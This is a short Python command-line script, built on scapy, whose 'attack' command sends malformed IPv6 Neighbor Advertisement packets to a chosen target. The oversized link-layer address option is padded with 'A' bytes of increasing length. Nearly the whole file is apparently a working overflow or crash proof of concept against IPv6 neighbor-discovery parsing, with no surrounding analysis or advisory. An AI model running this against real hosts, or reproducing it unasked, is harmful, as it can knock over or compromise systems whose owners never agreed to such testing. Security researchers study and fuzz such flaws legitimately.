#!/usr/bin/env python3

import click
import ipaddress

from scapy.all import *
import binascii

def is_ipv6(address: str) -> bool:
    try:
        ip = ipaddress.ip_address(address)
        return isinstance(ip, ipaddress.IPv6Address)
    except ValueError:
        return False


conf.verb = 1

def send_overflow_packet(na_packet, payload_size):
    # This is a used so the recipient knows the MAC address of the sender
    # lladdr = MAC being advertised
    oversize_option = ICMPv6NDOptSrcLLAddr(lladdr="00:11:22:33:44:55") / Raw(load="A"*payload_size)
    malformed_packet = na_packet/oversize_option

    send(malformed_packet)
    print(f"[+] Sent packet with payload size {payload_size}")
    print(f"[+]     - Payload (first 20 bytes): {bytes(malformed_packet)[:20]}")
    print(f"[+]     - Hexdump (first 50 bytes): {binascii.hexlify(bytes(malformed_packet))[:100]}")


@click.group()
def cli():
    pass


@click.command()
@click.option('--ip', help='Host or IP address of target', default="::1")
def attack(ip):

    if not is_ipv6(ip):
        print(f"[-] FATAL: Invalid ip passed, expected ipv6 got {ip}")
        exit(-1)

    target_ip = ip

    # ICMPv6ND_NA stands for Neightbor Advertisement. Its an ICMPv6 message used in Neightbor
    # Discovery Protocol (
    #   Router flag = 0 (not router), Solicited flag = 1 (is a response), Override = 1 (overwrite the cache entry)
    # ) tgt = target ipv6 address the message is advertising.
    na_packet = IPv6(dst=target_ip)/ICMPv6ND_NA(R=0, S=1, O=1, tgt=target_ip)

    for size in [0, 25, 50, 100, 200, 300, 400]:
        send_overflow_packet(na_packet, size)



if __name__ == "__main__":
    cli.add_command(attack)
    cli()
